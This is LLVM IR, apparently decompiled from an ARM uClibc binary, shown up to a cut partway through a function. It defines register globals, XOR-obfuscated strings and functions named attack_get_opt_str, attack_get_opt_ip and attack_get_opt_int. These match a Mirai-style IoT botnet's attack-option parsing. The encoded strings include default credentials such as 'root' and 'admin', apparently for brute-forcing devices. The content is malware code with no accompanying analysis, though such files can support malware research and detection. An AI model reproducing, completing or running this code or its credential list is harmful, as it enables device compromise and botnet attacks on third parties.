source_filename = "test"
target datalayout = "e-p:32:32:32-f80:32:32"

%anon_struct_4 = type { i32, i32*, i8, i8 }
%anon_struct_13 = type { i32, i32*, i8, i8 }
%anon_struct_13.3 = type { i32, i32*, i8, i8 }
%vfp_regs = type { [16 x i64], i32 }

@r0 = internal unnamed_addr global i32 0
@r1 = internal unnamed_addr global i32 0
@r2 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@sb = internal unnamed_addr global i32 0
@sl = internal unnamed_addr global i32 0
@fp = internal unnamed_addr global i32 0
@ip = internal unnamed_addr global i32 0
@sp = internal unnamed_addr global i32 0
@lr = internal unnamed_addr global i32 0
@cpsr_z = internal unnamed_addr global i1 false
@cpsr_c = internal unnamed_addr global i1 false
@0 = external global i32
@global_var_20cf0.23 = global i32 0
@global_var_c350.27 = constant i32 -382906384
@global_var_11abc.29 = constant i32 -382909968
@global_var_20f14.33 = global i32 0
@global_var_b468.39 = constant i32 -382906384
@global_var_b8d4.41 = constant i32 -382906384
@global_var_abdc.43 = constant i32 -382906384
@global_var_a504.45 = constant i32 -382906384
@global_var_9de0.47 = constant i32 -382906384
@global_var_95b4.49 = constant i32 -382906384
@global_var_8f54.51 = constant i32 -382906384
@global_var_888c.53 = constant i32 -382906384
@global_var_23a2c.55 = global i32 0
@global_var_a500.58 = constant i32 145964
@global_var_c0c4.66 = constant i32 -382910448
@global_var_20da4.68 = global i32 64040
@global_var_23a34.72 = local_unnamed_addr global i32 0
@global_var_23a32.73 = local_unnamed_addr global i32 0
@global_var_20d9c.75 = global i32 -1
@global_var_20f18.80 = global i32 0
@global_var_180f4.87 = constant i32 10
@global_var_20da0.89 = global i32 -1
@global_var_12d80.94 = constant i32 -450904024
@global_var_fa28.95 = constant i32 -382910352
@global_var_180f8.99 = constant i32 16777216
@global_var_20f20.101 = global i32 0
@global_var_20f2c.103 = global i32 0
@global_var_20f24.105 = global i32 0
@global_var_20f28.107 = global i32 0
@global_var_23a48.117 = global i32 0
@global_var_20f64.119 = global i32 0
@global_var_20f30.121 = global i32 0
@global_var_20f5c.123 = global i32 0
@global_var_cf44.126 = constant i32 145992
@global_var_d1f4.128 = constant i32 135012
@global_var_23a40.130 = global i32 0
@global_var_23a44.132 = global i32 0
@global_var_20f36.135 = local_unnamed_addr global i32 0
@global_var_20f48.137 = global i32 0
@global_var_20f3c.139 = local_unnamed_addr global i32 0
@global_var_20f38.140 = local_unnamed_addr global i32 0
@global_var_20f3d.141 = local_unnamed_addr global i32 0
@global_var_20f56.144 = local_unnamed_addr global i32 0
@global_var_185d0.146 = constant i32 0
@global_var_18474.148 = constant [5 x i8] c"PMMV\00"
@global_var_18618.150 = constant [6 x i8] c"CFOKL\00"
@global_var_18100.152 = constant i32 387006810
@global_var_18108.154 = constant [6 x i8] c"TKXZT\00"
@global_var_18110.156 = constant i32 437918234
@global_var_18118.158 = constant [8 x i8] c"ZOJFKRA\00"
@global_var_18120.160 = constant [8 x i8] c"FGDCWNV\00"
@global_var_18128.162 = constant [9 x i8] c"HWCLVGAJ\00"
@global_var_18134.164 = constant i32 370216979
@global_var_1813c.166 = constant i32 269555223
@global_var_18144.168 = constant [8 x i8] c"QWRRMPV\00"
@global_var_18550.170 = constant i32 370216979
@global_var_1814c.172 = constant [9 x i8] c"RCQQUMPF\00"
@global_var_18158.174 = constant i32 370216979
@global_var_18160.176 = constant [5 x i8] c"WQGP\00"
@global_var_18168.178 = constant [5 x i8] c"RCQQ\00"
@global_var_18170.180 = constant i32 1263486531
@global_var_182c4.182 = constant i32 320017171
@global_var_1817c.184 = constant [9 x i8] c"QOACFOKL\00"
@global_var_18188.186 = constant i32 336860180
@global_var_18190.188 = constant i32 324292169
@global_var_18198.190 = constant [14 x i8] c"cFOKLKQVPCVMP\00"
@global_var_181a8.192 = constant [7 x i8] c"OGKLQO\00"
@global_var_181b0.194 = constant [4 x i8] c"@WJ\00"
@global_var_181b4.196 = constant [7 x i8] c"RW@NKA\00"
@global_var_181bc.198 = constant [8 x i8] c"QGPTKAG\00"
@global_var_181c4.200 = constant [11 x i8] c"QWRGPTKQMP\00"
@global_var_181d0.202 = constant [6 x i8] c"EWGQV\00"
@global_var_181d8.204 = constant i32 1263486531
@global_var_181e0.206 = constant [14 x i8] c"CFOKLKQVPCVMP\00"
@global_var_181f0.208 = constant [5 x i8] c"W@LV\00"
@global_var_181f8.210 = constant i32 324292169
@global_var_18200.212 = constant i32 390551160
@global_var_18208.214 = constant i32 387009354
@global_var_cfa0.215 = constant i32 98832
@global_var_18210.216 = constant [6 x i8] c"HT@XF\00"
@global_var_18218.218 = constant [5 x i8] c"CLIM\00"
@global_var_18220.220 = constant [6 x i8] c"XNZZ\0C\00"
@global_var_18228.222 = constant [9 x i8] c"AJCLEGOG\00"
@global_var_18234.224 = constant i32 1867011861
@global_var_18244.226 = constant i32 1867011861
@global_var_18254.228 = constant [7 x i8] c"Q[QVGO\00"
@global_var_1825c.230 = constant [5 x i8] c"KIU@\00"
@global_var_18264.232 = constant [9 x i8] c"FPGCO@MZ\00"
@global_var_18270.234 = constant [8 x i8] c"PGCNVGI\00"
@global_var_18278.236 = constant i32 303174162
@global_var_18284.238 = constant i32 303174162
@global_var_1828c.240 = constant i32 320017171
@global_var_18294.242 = constant i32 1263486531
@global_var_1812c.244 = constant [5 x i8] c"VGAJ\00"
@global_var_182a0.246 = constant i32 454761243
@global_var_182ac.248 = constant [6 x i8] c"oGKLQ\00"
@global_var_182b4.250 = constant [4 x i8] c"hta\00"
@global_var_182b8.252 = constant i32 319820054
@global_var_182c0.254 = constant i32 320017171
@global_var_182cc.256 = constant [7 x i8] c"WVQVCP\00"
@global_var_182d4.258 = constant [9 x i8] c"XMMOCFQN\00"
@global_var_182e0.260 = constant i32 1263486531
@global_var_182e8.262 = constant i32 303059531
@global_var_182f0.264 = constant i32 303125067
@global_var_182f8.266 = constant i32 303452747
@global_var_18300.268 = constant [7 x i8] c"@KLVGA\00"
@global_var_d014.269 = constant i32 99080
@global_var_18308.270 = constant [8 x i8] c"VQWLCOK\00"
@global_var_18310.272 = constant i32 323043395
@global_var_18318.274 = constant i32 319951888
@global_var_18320.276 = constant [7 x i8] c"Q[LLGV\00"
@global_var_18328.278 = constant [9 x i8] c"@C[CLFQN\00"
@global_var_18334.280 = constant [6 x i8] c"SWQGP\00"
@global_var_1842c.282 = constant i32 1118227
@global_var_1833c.284 = constant i32 370216979
@global_var_18344.286 = constant [8 x i8] c"oCLCEGP\00"
@global_var_1834c.288 = constant [4 x i8] c"CFO\00"
@global_var_18350.290 = constant [8 x i8] c"OCLCEGP\00"
@global_var_18358.292 = constant [7 x i8] c"DPKGLF\00"
@global_var_18360.294 = constant [4 x i8] c"CRA\00"
@global_var_18364.296 = constant i32 1263421261
@global_var_18370.298 = constant [5 x i8] c"VKLK\00"
@global_var_18378.300 = constant [7 x i8] c"CQAGLF\00"
@global_var_18380.302 = constant i32 1265504102
@global_var_18388.304 = constant [6 x i8] c"FNKLI\00"
@global_var_18390.306 = constant [6 x i8] c"NMEKL\00"
@global_var_18398.308 = constant i32 1296912387
@global_var_183a0.310 = constant [9 x i8] c"AC@NGAMO\00"
@global_var_183ac.312 = constant [7 x i8] c"PMWVGP\00"
@global_var_183b4.314 = constant [8 x i8] c"LGVMRKC\00"
@global_var_183bc.316 = constant [7 x i8] c"Q[QCFO\00"
@global_var_183c4.318 = constant [8 x i8] c"CLKAWQV\00"
@global_var_183cc.320 = constant [6 x i8] c"FG@WE\00"
@global_var_183d4.322 = constant [10 x i8] c"F\0CG\0C@\0CW\0CE\00"
@global_var_183e0.324 = constant [5 x i8] c"GAJM\00"
@global_var_183e8.326 = constant [5 x i8] c"FKCE\00"
@global_var_183f0.328 = constant [7 x i8] c"QUKVAJ\00"
@global_var_183c0.330 = constant [3 x i8] c"FO\00"
@global_var_183f8.332 = constant [7 x i8] c"VGNLGV\00"
@global_var_18400.334 = constant i32 370216979
@global_var_1840c.336 = constant [5 x i8] c"VMMP\00"
@global_var_18414.338 = constant [7 x i8] c"ACNTKL\00"
@global_var_1841c.340 = constant i32 370216979
@global_var_18428.342 = constant i32 1447906640
@global_var_18430.344 = constant i32 1447512643
@global_var_1843c.346 = constant i32 454302484
@global_var_18444.348 = constant i32 387400530
@global_var_18450.350 = constant i32 319885331
@global_var_18458.352 = constant i32 1986882928
@global_var_18460.354 = constant [7 x i8] c"CNRKLG\00"
@global_var_18468.356 = constant i32 457659992
@global_var_18470.358 = constant i32 303043392
@global_var_1847c.360 = constant [9 x i8] c"rcqqumpf\00"
@global_var_18488.362 = constant [6 x i8] c"cfokl\00"
@global_var_18490.364 = constant [8 x i8] c"LGVEGCP\00"
@global_var_18498.366 = constant i32 303257172
@global_var_184a0.368 = constant [4 x i8] c"K@O\00"
@global_var_184a4.370 = constant [7 x i8] c"T[CVVC\00"
@global_var_184ac.372 = constant [6 x i8] c"cFOKL\00"
@global_var_184b4.374 = constant i32 373380675
@global_var_184bc.376 = constant [7 x i8] c"OKAPMQ\00"
@global_var_184c4.378 = constant [6 x i8] c"QGVWR\00"
@global_var_184cc.380 = constant [8 x i8] c"AMOACQV\00"
@global_var_184d4.382 = constant [4 x i8] c"RMQ\00"
@global_var_184d8.384 = constant [4 x i8] c"UUU\00"
@global_var_184dc.386 = constant i32 303176208
@global_var_184e4.388 = constant [5 x i8] c"w`lv\00"
@global_var_184ec.390 = constant [7 x i8] c"LGVOCL\00"
@global_var_184f4.392 = constant [6 x i8] c"Cfokl\00"
@global_var_184fc.394 = constant [7 x i8] c"FCGOML\00"
@global_var_18504.396 = constant [5 x i8] c"FGOM\00"
@global_var_1850c.398 = constant [6 x i8] c"CPPKQ\00"
@global_var_18514.400 = constant [8 x i8] c"nKLIQ[Q\00"
@global_var_1851c.402 = constant [7 x i8] c"ANKGLV\00"
@global_var_18524.404 = constant [6 x i8] c"AKQAM\00"
@global_var_1852c.406 = constant [6 x i8] c"akqam\00"
@global_var_18534.408 = constant [6 x i8] c"QWRGP\00"
@global_var_1853c.410 = constant [5 x i8] c"QWPV\00"
@global_var_d14c.411 = constant i32 99652
@global_var_18544.412 = constant i32 370611221
@global_var_182d8.414 = constant [5 x i8] c"CFQN\00"
@global_var_1854c.416 = constant i32 1313949251
@global_var_18558.418 = constant [7 x i8] c"RCVPMN\00"
@global_var_18560.420 = constant i32 387007823
@global_var_18568.422 = constant [7 x i8] c"OGPNKL\00"
@global_var_18570.424 = constant [9 x i8] c"LGVCFOKL\00"
@global_var_1857c.426 = constant [9 x i8] c"JGUNRCAI\00"
@global_var_18588.428 = constant [7 x i8] c"lGVkaQ\00"
@global_var_18590.430 = constant i32 1179729984
@global_var_1859c.432 = constant [5 x i8] c"lwnn\00"
@global_var_185a4.434 = constant [9 x i8] c"CFOKLVVF\00"
@global_var_185b0.436 = constant [9 x i8] c"MRGPCVMP\00"
@global_var_185bc.438 = constant [9 x i8] c"rNAOqRkR\00"
@global_var_185c8.440 = constant i32 269488144
@global_var_185d4.442 = constant [9 x i8] c"QGAWPKV[\00"
@global_var_185e0.444 = constant [9 x i8] c"OMWLVQ[Q\00"
@global_var_185ec.446 = constant [8 x i8] c"OGOMVGA\00"
@global_var_185f4.448 = constant i32 1464562030
@global_var_18604.450 = constant i32 2003334929
@global_var_18614.452 = constant [10 x i8] c"OWQGCFOKL\00"
@global_var_18620.454 = constant i32 1196513135
@global_var_1862c.456 = constant [10 x i8] c"QVMPUCVAJ\00"
@global_var_18638.458 = constant [11 x i8] c"QRGAKCNKQV\00"
@global_var_18644.460 = constant [10 x i8] c"CFOKLRNFV\00"
@global_var_18650.462 = constant [10 x i8] c"RNFVCFOKL\00"
@global_var_1865c.464 = constant i32 1279478337
@global_var_18668.466 = constant [13 x i8] c"VGNGAMOCFOKL\00"
@global_var_18678.468 = constant [13 x i8] c"CFOKLVGNGAMO\00"
@global_var_18688.470 = constant [7 x i8] c"EWGQV\22\00"
@global_var_18690.472 = constant i32 336675162
@global_var_18698.474 = constant [9 x i8] c"FGDCWNV\22\00"
@global_var_186a4.476 = constant [8 x i8] c"CLVQNS\22\00"
@global_var_186ac.478 = constant [12 x i8] c"QWRGPTKQMP\22\00"
@global_var_186b8.480 = constant i32 1178819416
@global_var_186c4.482 = constant [6 x i8] c"PMMV\22\00"
@global_var_20f40.483 = local_unnamed_addr global i32 0
@global_var_20f3e.484 = local_unnamed_addr global i32 0
@global_var_20f44.485 = local_unnamed_addr global i32 0
@global_var_20f4c.487 = local_unnamed_addr global i32 0
@global_var_20f58.488 = local_unnamed_addr global i32 0
@global_var_ccd4.496 = constant i32 -382910352
@global_var_186cc.498 = constant [3 x i8] c"\0D\0A\00"
@global_var_186d8.500 = constant i32 2096127
@global_var_186cf.502 = constant i32 2095871
@global_var_23a50.509 = global i32 0
@global_var_20dac.512 = global i32 1043935
@global_var_186dc.517 = constant i32 39228
@global_var_23a58.518 = local_unnamed_addr global i32 0
@global_var_23a5c.519 = local_unnamed_addr global i32 0
@global_var_186e0.521 = constant i32 55430
@global_var_23a60.522 = local_unnamed_addr global i32 0
@global_var_23a64.523 = local_unnamed_addr global i32 0
@global_var_186e4.525 = constant [20 x i8] c"jT^VXYsTZZXOnQ\5CDXO=\00"
@global_var_23a68.526 = local_unnamed_addr global i32 0
@global_var_23a6c.527 = local_unnamed_addr global i32 0
@global_var_186f8.529 = constant [7 x i8] c"NUXQQ=\00"
@global_var_23a70.530 = local_unnamed_addr global i32 0
@global_var_23a74.531 = local_unnamed_addr global i32 0
@global_var_18700.533 = constant [8 x i8] c"XS\5C_QX=\00"
@global_var_23a78.534 = local_unnamed_addr global i32 0
@global_var_23a7c.535 = local_unnamed_addr global i32 0
@global_var_18708.537 = constant [8 x i8] c"NDNIXP=\00"
@global_var_23a80.538 = local_unnamed_addr global i32 0
@global_var_23a84.539 = local_unnamed_addr global i32 0
@global_var_18710.541 = constant [4 x i8] c"NU=\00"
@global_var_23a8c.542 = local_unnamed_addr global i32 0
@global_var_23a88.543 = local_unnamed_addr global i32 0
@global_var_18714.545 = constant i32 1398038290
@global_var_23a94.546 = local_unnamed_addr global i32 0
@global_var_23a90.547 = local_unnamed_addr global i32 0
@global_var_18730.549 = constant i32 1449022538
@global_var_23a9c.550 = local_unnamed_addr global i32 0
@global_var_23a98.551 = local_unnamed_addr global i32 0
@global_var_18750.553 = constant [10 x i8] c"S^ROOX^I=\00"
@global_var_23aa4.554 = local_unnamed_addr global i32 0
@global_var_23aa0.555 = local_unnamed_addr global i32 0
@global_var_1875c.557 = constant [9 x i8] c"\5CNNJROY=\00"
@global_var_23aac.558 = local_unnamed_addr global i32 0
@global_var_23aa8.559 = local_unnamed_addr global i32 0
@global_var_18768.561 = constant [6 x i8] c"RZTS=\00"
@global_var_23ab4.562 = local_unnamed_addr global i32 0
@global_var_23ab0.563 = local_unnamed_addr global i32 0
@global_var_18770.565 = constant [7 x i8] c"XSIXO=\00"
@global_var_23ab8.566 = local_unnamed_addr global i32 0
@global_var_23abc.567 = local_unnamed_addr global i32 0
@global_var_18778.569 = constant i32 1213361769
@global_var_23ac0.570 = local_unnamed_addr global i32 0
@global_var_23ac4.571 = local_unnamed_addr global i32 0
@global_var_18790.573 = constant i32 1581864978
@global_var_23acc.574 = local_unnamed_addr global i32 0
@global_var_23ac8.575 = local_unnamed_addr global i32 0
@global_var_187a4.577 = constant [12 x i8] c"S\5CPXNXOKXO=\00"
@global_var_23ad0.578 = local_unnamed_addr global i32 0
@global_var_23ad4.579 = local_unnamed_addr global i32 0
@global_var_187b0.581 = constant i32 1264081170
@global_var_23ad8.582 = local_unnamed_addr global i32 0
@global_var_23adc.583 = local_unnamed_addr global i32 0
@global_var_187c8.585 = constant i32 1264081170
@global_var_23ae0.586 = local_unnamed_addr global i32 0
@global_var_23ae4.587 = local_unnamed_addr global i32 0
@global_var_187dc.589 = constant i32 1208552964
@global_var_23ae8.590 = local_unnamed_addr global i32 0
@global_var_23aec.591 = local_unnamed_addr global i32 0
@global_var_187f4.593 = constant [12 x i8] c"YKOnI\5COIHM=\00"
@global_var_23af4.594 = local_unnamed_addr global i32 0
@global_var_23af0.595 = local_unnamed_addr global i32 0
@global_var_1108c.597 = constant i32 -509607924
@global_var_20cf4.602 = global i32 0
@global_var_10b24.623 = constant i32 -514850804
@global_var_108e4.638 = constant i32 -442564532
@global_var_108a4.641 = constant i32 -481296320
@global_var_10a7c.669 = constant i32 -478871519
@global_var_11520.686 = constant i32 -478805983
@global_var_11908.696 = constant i32 -382906384
@global_var_13800.706 = constant i32 -442544040
@global_var_1208c.725 = constant i32 -369098502
@global_var_e8dc.727 = constant i32 -481099741
@global_var_12a60.740 = constant i32 -382910288
@global_var_12c10.752 = constant i32 -2020859901
@global_var_12cfc.755 = constant i32 -494075872
@global_var_10078.756 = constant i32 -382910336
@global_var_23e80.759 = local_unnamed_addr global i32 0
@global_var_11d38.772 = constant i32 -442543860
@global_var_10190.780 = constant i32 -369093262
@global_var_13bc0.823 = constant i32 -443088884
@global_var_151e0.841 = constant i32 -382906384
@global_var_c54c.853 = constant i32 -509607927
@global_var_14ca0.871 = constant i32 -382910448
@global_var_16914.872 = constant i32 -382909968
@global_var_b744.888 = constant i32 167772233
@global_var_15c6c.890 = constant i32 -456978431
@global_var_a780.925 = constant i32 -443744248
@global_var_166c8.926 = constant i32 -382910352
@global_var_17050.939 = constant i32 -481296376
@global_var_17148.940 = constant i32 -481296376
@global_var_171cc.941 = constant i32 -369098732
@global_var_20ef4.13 = external global i8*
@global_var_20f10.31 = external global i8*
@global_var_20f11.37 = global i8 0
@global_var_23a30.70 = global i16* null
@1 = internal constant [2 x i8] c"\01\00"
@global_var_20da8.77 = global i8* getelementptr inbounds ([2 x i8], [2 x i8]* @1, i32 0, i32 0)
@global_var_20f1c.92 = external global i8*
@global_var_20f60.125 = global i16* null
@global_var_20f34.134 = external global i8*
@global_var_20f54.138 = local_unnamed_addr global i8 0
@global_var_20f4a.142 = local_unnamed_addr global i16 0
@global_var_20f55.143 = local_unnamed_addr global i8 0
@global_var_20d4c.598 = local_unnamed_addr global i16 8

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  %v3_80d8 = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v3_80d8)
  %v31_80e0 = load i32, i32* @r0, align 4
  ret i32 %v31_80e0
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_80f0 = load i32, i32* @r4, align 4
  store i32 %v3_80f0, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i8** @global_var_20ef4.13 to i32), i32* %r4.global-to-local, align 4
  %v2_80f8 = load i8, i8* bitcast (i8** @global_var_20ef4.13 to i8*), align 4
  %v2_80fc = icmp eq i8 %v2_80f8, 0
  br i1 %v2_80fc, label %dec_label_pc_8104, label %dec_label_pc_8120

dec_label_pc_8104:                                ; preds = %entry
  call void @__pseudo_cond_branch(i1 false, i32 0)
  %v2_811c = load i32, i32* %r4.global-to-local, align 4
  %v3_811c = inttoptr i32 %v2_811c to i8*
  store i8 1, i8* %v3_811c, align 1
  %v2_8120.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8120

dec_label_pc_8120:                                ; preds = %entry, %dec_label_pc_8104
  %v2_8120 = phi i32 [ %v3_80f0, %entry ], [ %v2_8120.pre, %dec_label_pc_8104 ]
  store i32 %v2_8120, i32* %r4.global-to-local, align 4
  ret i32 undef

; uselistorder directives
  uselistorder i8** @global_var_20ef4.13, { 1, 0 }
  uselistorder label %dec_label_pc_8120, { 1, 0 }
}

define i32 @frame_dummy() local_unnamed_addr {
bb:
  call void @__pseudo_cond_branch(i1 false, i32 0)
  %v2_8158 = load i32, i32* @global_var_20cf0.23, align 4
  %v2_815c = icmp eq i32 %v2_8158, 0
  br i1 %v2_815c, label %dec_label_pc_8174, label %dec_label_pc_8164

dec_label_pc_8164:                                ; preds = %bb
  call void @__pseudo_cond_branch(i1 false, i32 0)
  br label %dec_label_pc_8174

dec_label_pc_8174:                                ; preds = %bb, %dec_label_pc_8164
  ret i32 ptrtoint (i32* @global_var_20cf0.23 to i32)

; uselistorder directives
  uselistorder i32* @global_var_20cf0.23, { 1, 0 }
  uselistorder label %dec_label_pc_8174, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @_start(i32 %arg1, i32 %arg2) local_unnamed_addr #0 {
entry:
  %stack_var_4 = alloca i32, align 4
  store i32 0, i32* @fp, align 4
  %v4_819c = ptrtoint i32* %stack_var_4 to i32
  %v8_81bc = call i32 @__uClibc_main(i32 ptrtoint (i32* @global_var_c350.27 to i32), i32 %arg2, i32* nonnull %stack_var_4, i32 32980, i32 98532, i32 %arg1, i32 %v4_819c)
  %v0_81c0 = call i32 @abort()
  ret i32 %v0_81c0
}

define i32 @attack_get_opt_str(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_81d0 = icmp eq i32 %arg1, 0
  br i1 %v2_81d0, label %dec_label_pc_8218, label %dec_label_pc_81e0

dec_label_pc_81e0:                                ; preds = %entry
  %v0_81e0 = load i32, i32* %r1.global-to-local, align 4
  %v1_81e0 = add i32 %v0_81e0, 4
  %v2_81e0 = inttoptr i32 %v1_81e0 to i8*
  %v3_81e0 = load i8, i8* %v2_81e0, align 1
  %v4_81e0 = zext i8 %v3_81e0 to i32
  %v9_81e4 = icmp eq i32 %v4_81e0, %arg3
  br i1 %v9_81e4, label %dec_label_pc_8224, label %dec_label_pc_8208.preheader

dec_label_pc_8208.preheader:                      ; preds = %dec_label_pc_81e0
  br label %dec_label_pc_8208

dec_label_pc_81f8:                                ; preds = %dec_label_pc_8208
  %v1_81f8 = add i32 %v0_8200.in, 12
  %v2_81f8 = inttoptr i32 %v1_81f8 to i8*
  %v3_81f8 = load i8, i8* %v2_81f8, align 1
  %v4_81f8 = zext i8 %v3_81f8 to i32
  %v9_81fc = icmp eq i32 %v4_81f8, %arg3
  br i1 %v9_81fc, label %dec_label_pc_8224, label %dec_label_pc_8208

dec_label_pc_8208:                                ; preds = %dec_label_pc_8208.preheader, %dec_label_pc_81f8
  %v0_8200.in = phi i32 [ %v0_81e0, %dec_label_pc_8208.preheader ], [ %v0_8200, %dec_label_pc_81f8 ]
  %v0_8208 = phi i32 [ 0, %dec_label_pc_8208.preheader ], [ %v1_8208, %dec_label_pc_81f8 ]
  %v0_8200 = add i32 %v0_8200.in, 8
  %v1_8208 = add i32 %v0_8208, 1
  %v9_820c = icmp eq i32 %v1_8208, %arg1
  store i32 %v0_8200, i32* %r1.global-to-local, align 4
  br i1 %v9_820c, label %dec_label_pc_8218, label %dec_label_pc_81f8

dec_label_pc_8218:                                ; preds = %dec_label_pc_8208, %entry, %dec_label_pc_8224
  %v0_8218 = phi i32 [ %arg4, %entry ], [ %v2_8224, %dec_label_pc_8224 ], [ %arg4, %dec_label_pc_8208 ]
  ret i32 %v0_8218

dec_label_pc_8224:                                ; preds = %dec_label_pc_81f8, %dec_label_pc_81e0
  %v0_8224 = phi i32 [ %v0_81e0, %dec_label_pc_81e0 ], [ %v0_8200, %dec_label_pc_81f8 ]
  %v1_8224 = inttoptr i32 %v0_8224 to i32*
  %v2_8224 = load i32, i32* %v1_8224, align 4
  br label %dec_label_pc_8218

; uselistorder directives
  uselistorder i32 %v1_8208, { 1, 0 }
  uselistorder i32 %v0_8200, { 1, 0, 2 }
  uselistorder i32 %v0_8200.in, { 1, 0 }
  uselistorder i32 %v0_81e0, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8218, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8208, { 1, 0 }
}

define i32 @attack_get_opt_ip(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v2_822c = icmp eq i32 %arg1, 0
  %v3_8230 = load i32, i32* @r4, align 4
  store i32 %v3_8230, i32* %stack_var_-8, align 4
  %v6_8230 = load i32, i32* @lr, align 4
  store i32 %arg4, i32* @r4, align 4
  br i1 %v2_822c, label %dec_label_pc_8274, label %dec_label_pc_823c

dec_label_pc_823c:                                ; preds = %entry
  %v0_823c = load i32, i32* %r1.global-to-local, align 4
  %v1_823c = add i32 %v0_823c, 4
  %v2_823c = inttoptr i32 %v1_823c to i8*
  %v3_823c = load i8, i8* %v2_823c, align 1
  %v4_823c = zext i8 %v3_823c to i32
  %v9_8240 = icmp eq i32 %v4_823c, %arg3
  br i1 %v9_8240, label %dec_label_pc_8280, label %dec_label_pc_8264.preheader

dec_label_pc_8264.preheader:                      ; preds = %dec_label_pc_823c
  br label %dec_label_pc_8264

dec_label_pc_8254:                                ; preds = %dec_label_pc_8264
  %v1_8254 = add i32 %v0_825c.in, 12
  %v2_8254 = inttoptr i32 %v1_8254 to i8*
  %v3_8254 = load i8, i8* %v2_8254, align 1
  %v4_8254 = zext i8 %v3_8254 to i32
  %v9_8258 = icmp eq i32 %v4_8254, %arg3
  br i1 %v9_8258, label %dec_label_pc_8280, label %dec_label_pc_8264

dec_label_pc_8264:                                ; preds = %dec_label_pc_8264.preheader, %dec_label_pc_8254
  %v0_825c.in = phi i32 [ %v0_823c, %dec_label_pc_8264.preheader ], [ %v0_825c, %dec_label_pc_8254 ]
  %v0_8264 = phi i32 [ 0, %dec_label_pc_8264.preheader ], [ %v1_8264, %dec_label_pc_8254 ]
  %v0_825c = add i32 %v0_825c.in, 8
  %v1_8264 = add i32 %v0_8264, 1
  %v9_8268 = icmp eq i32 %v1_8264, %arg1
  store i32 %v0_825c, i32* %r1.global-to-local, align 4
  br i1 %v9_8268, label %dec_label_pc_8274, label %dec_label_pc_8254

dec_label_pc_8274:                                ; preds = %dec_label_pc_8264, %dec_label_pc_8280, %entry, %dec_label_pc_828c
  %v2_8278 = phi i32 [ %v3_8230, %dec_label_pc_8280 ], [ %v3_8230, %entry ], [ %v2_8278.pre, %dec_label_pc_828c ], [ %v3_8230, %dec_label_pc_8264 ]
  %v0_8274 = phi i32 [ %arg4, %dec_label_pc_8280 ], [ %arg4, %entry ], [ %v1_828c, %dec_label_pc_828c ], [ %arg4, %dec_label_pc_8264 ]
  store i32 %v2_8278, i32* @r4, align 4
  store i32 %v6_8230, i32* @lr, align 4
  ret i32 %v0_8274

dec_label_pc_8280:                                ; preds = %dec_label_pc_8254, %dec_label_pc_823c
  %v0_8280 = phi i32 [ %v0_823c, %dec_label_pc_823c ], [ %v0_825c, %dec_label_pc_8254 ]
  %v1_8280 = inttoptr i32 %v0_8280 to i32*
  %v2_8280 = load i32, i32* %v1_8280, align 4
  store i32 %v2_8280, i32* @r0, align 4
  %v2_8284 = icmp eq i32 %v2_8280, 0
  br i1 %v2_8284, label %dec_label_pc_8274, label %dec_label_pc_828c

dec_label_pc_828c:                                ; preds = %dec_label_pc_8280
  %v1_828c = call i32 @inet_addr(i32 %v2_8280)
  %v2_8278.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8274

; uselistorder directives
  uselistorder i32 %v1_8264, { 1, 0 }
  uselistorder i32 %v0_825c, { 1, 0, 2 }
  uselistorder i32 %v0_825c.in, { 1, 0 }
  uselistorder i32 %v0_823c, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8274, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_8264, { 1, 0 }
}

define i32 @attack_get_opt_int(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v2_8298 = icmp eq i32 %arg1, 0
  %v3_829c = load i32, i32* @r4, align 4
  store i32 %v3_829c, i32* %stack_var_-8, align 4
  %v6_829c = load i32, i32* @lr, align 4
  br i1 %v2_8298, label %dec_label_pc_82e0, label %dec_label_pc_82a8

dec_label_pc_82a8:                                ; preds = %entry
  %v0_82a8 = load i32, i32* %r1.global-to-local, align 4
  %v1_82a8 = add i32 %v0_82a8, 4
  %v2_82a8 = inttoptr i32 %v1_82a8 to i8*
  %v3_82a8 = load i8, i8* %v2_82a8, align 1
  %v4_82a8 = zext i8 %v3_82a8 to i32
  %v9_82ac = icmp eq i32 %v4_82a8, %arg3
  br i1 %v9_82ac, label %dec_label_pc_82ec, label %dec_label_pc_82d0.preheader

dec_label_pc_82d0.preheader:                      ; preds = %dec_label_pc_82a8
  br label %dec_label_pc_82d0

dec_label_pc_82c0:                                ; preds = %dec_label_pc_82d0
  %v1_82c0 = add i32 %v0_82c8.in, 12
  %v2_82c0 = inttoptr i32 %v1_82c0 to i8*
  %v3_82c0 = load i8, i8* %v2_82c0, align 1
  %v4_82c0 = zext i8 %v3_82c0 to i32
  %v9_82c4 = icmp eq i32 %v4_82c0, %arg3
